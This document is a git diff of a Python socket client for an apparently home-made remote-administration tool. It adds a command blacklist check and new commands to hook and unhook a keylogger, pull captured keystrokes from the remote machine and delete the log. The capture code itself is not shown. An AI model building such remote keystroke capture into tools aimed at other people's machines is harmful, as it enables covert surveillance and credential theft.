@@ -6,9 +6,11 @@ import receiveProcess
 import threading
 from GUI import communicate
 from GUI import menuScreen
-from multiprocessing import Process
+from receiveKeyLogger import *
 
 
+def valid(command):
+    return not(command in communicate.blackListCommand)
 
 def start_client():
     clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -30,7 +32,7 @@ def start_client():
             if communicate.command != '' : 
                 command = communicate.command
                 break
-        clientsocket.send(command.encode('ascii'))
+        if valid(command) : clientsocket.send(command.encode('ascii'))
         command = list(map(str, command.split()))
         flag = command[0]
         parameter = -1
@@ -41,6 +43,9 @@ def start_client():
         elif flag == "listprocess": receiveProcess.receiveProcess(clientsocket)
         elif flag == "killprocess": receiveProcess.receiveStatus(clientsocket)
         elif flag == "listrunningapp": receiveRunningApp.receiveRunningApp(clientsocket)
+        elif flag == "hook" or flag == "unhook": pass 
+        elif flag == "sendkeylogger": receiveKeylogger(clientsocket)
+        elif flag == "deletecontentkeylogger": deleteContentKeyLogger()
         elif flag == "shutdown": break
         else:
             data = clientsocket.recv(1024)
